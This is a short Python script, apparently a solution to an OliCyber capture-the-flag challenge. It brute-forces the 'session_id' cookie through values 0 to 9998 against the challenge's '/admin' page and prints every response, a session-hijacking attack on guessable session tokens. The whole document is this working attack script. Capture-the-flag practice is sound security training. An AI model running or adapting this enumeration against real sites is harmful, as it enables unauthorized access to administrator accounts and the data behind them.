import requests

session = requests.session()





for i in range(9999):
    value = str(i)

    cookie = {"session_id":value}

    req = session.get("http://too-small-reminder.challs.olicyber.it/admin", cookies=cookie)

    print(req.text)
    